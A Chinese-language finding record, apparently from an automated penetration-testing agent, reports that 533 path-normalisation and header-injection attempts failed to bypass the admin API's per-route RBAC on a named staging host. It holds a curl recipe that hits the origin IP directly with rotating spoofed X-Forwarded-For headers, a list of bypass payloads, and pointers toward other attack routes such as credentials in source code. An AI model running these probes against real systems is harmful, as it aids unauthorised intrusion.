# adminstaging.fanatical.com /api/admin/* 逐路由 RBAC 的路径规范化与头注入绕过矩阵系统性阴性（533 次实测）

- **code**: fanatical-adminstaging-api-admin-rbac-path-header-bypass-neg
- **kind**: poc
- **category**: auth-bypass
- **component**: Heroku + 逐路由 RBAC 的后台 API（Express 式路由）
- **severity**: low
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 本机（Linux 侧 Bash，任务 task#3，intent #3155）对 adminstaging.fanatical.com 源站直连 3.33.240.98 + Host 头 + credential#26 staging 顾客 Bearer 实测 533 次：149 RBAC403 / 142 AUTH401 / 139 NOMATCH404 / 64 SPA5013 / 7 OPTIONS204 / 5 公开 /api/all/en 200；0 个 200 业务 JSON、0 个 429/5xx。大小写(ALLUPPER/MixedCase)、尾斜杠命中同一 handler 后仍 401/403 同权限名；%2F/%252F/%2e%2e/..;/./x..//反斜杠全部 404(0B)/SPA；X-HTTP-Method-Override、X-Original-URL、X-Rewrite-URL、X-Forwarded-Prefix、XFF 127.0.0.1/10.0.0.1/X-Real-IP/True-Client-IP、?permission=/X-Permission 等全部无效；Cookie AdminAuth 与 query token 不被 /api/admin 接受。证据文件 /opt/artex/data/tasks/3/i3155/matrix_results.tsv、supp_results.tsv。
- **path**: pocs/fanatical-adminstaging-api-admin-rbac-path-header-bypass-neg/poc.txt
- **created_at**: 2026-11-11T21:57:43.680Z
- **engine**: https://adminstaging.fanatical.com/api/admin/*

## 描述

结论：adminstaging 的后台 RBAC 是逐路由中间件，路由匹配层（大小写/尾斜杠/后缀宽容）与鉴权层一致，不存在“路由匹配正常化但鉴权按原始路径判定”的错位；任何路径规范化/编码/头注入/方法覆盖/内网 IP 伪造/permission 名注入都不能跳过认证或权限校验。

## 用法

```
后续 worker 不要在这条路由面上重复路径/头绕过：大小写与尾斜杠会被同一 RBAC 接住，编码/点段/..;/ 不匹配路由，override/rewrite/IP 伪造/permission 注入全无效。剩余后台入口思路转向跨环境会话信任、角色字段写入、源码凭据。注意该 app 的非 GET 未知路径返回 200/5013B SPA，纯按 200 判命中是假阳性。
```

## 正文

```
# 复测配方
HOST=adminstaging.fanatical.com; IP=3.33.240.98; TOK=<staging 顾客 Bearer>
curl -sk --noproxy '*' --path-as-is --resolve $HOST:443:$IP -H "Host: $HOST" \
  -H "anonid: $(uuidgen)" -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM" \
  -H "Authorization: Bearer $TOK" "https://$HOST<PATH>"

# 四态判据（本 app 关键）
- 已挂载 + 无 token        -> 401 45B {"code":401,"error":"User not authenticated"}
- 已挂载 + customer token  -> 403 88~93B {"code":403,"error":"User not permitted to <perm>","user":"<token 首段>"}
- 未知 GET /api/*          -> 404 0B
- 未知非 GET /api/*        -> 200 5013B SPA(<title>Admin | Fanatical</title>)  ← 假阳性陷阱
- OPTIONS 任意路径         -> 204 空体（含未知路径；框架级预检，无数据）

# 覆盖与结果
- 路径 28 变体 × 4 核心路由 × 2 鉴权态 = 224：大小写(ALLUPPER/MixedCase)/尾斜杠命中同一 handler 但 401/403 同权限名；%2F、尾 %2F、%252F、%2e%2e、%2e%2e%2f、%2e%2e%252f、/./、/x/../、/api//admin、//api/admin、\\、..;/、;/、.;、..%3b 全部 404/SPA 不匹配。
- 10 条挂载 GET 路由 × 10 变体 × 2 = 200：全 401/403，权限名 product:view/product:preview/advert:view 与基线一致。
- 头/方法 52 次：X-HTTP-Method-Override/X-Method-Override 被忽略；X-Original-URL/X-Rewrite-URL/X-Forwarded-Prefix 被忽略（实际路径 /api/all/en 仍返回公开目录 141154B）；XFF 127.0.0.1/10.0.0.1/192.168.1.1/::1、X-Real-IP、True-Client-IP、X-Client-IP、Forwarded 无效；?permission=/?permissions=/?perm=/?role=admin/?admin=true 与 X-Permission/X-Permissions/X-User-Permissions/X-Admin-Permissions/X-Permissions-Granted/X-Role/X-User-Role/X-Admin-Role 无效；HEAD 同 GET 判。
- 令牌载体：?token=/?access_token= 401；Cookie: AdminAuth=<token> 401（仅 /bull-api 认该 cookie）；Authorization 裸 token(无 scheme) 403（接受，同一 user），小写 'bearer ' 401。
- 后缀宽匹配来自 :id 型泛路由（steam-app-idsx→401 而 /extra→404），非免鉴权别名；所有命中仍走同一 RBAC。
- 全程 0 个 429/5xx（每请求唯一 anonid+XFF）。

# 证伪条件
任一 /api/admin/* 变体在无 token 下返回 200 业务 JSON、或带 customer token 返回非 403 的业务响应、或 403 权限名与基线不一致，即推翻本阴性。
```
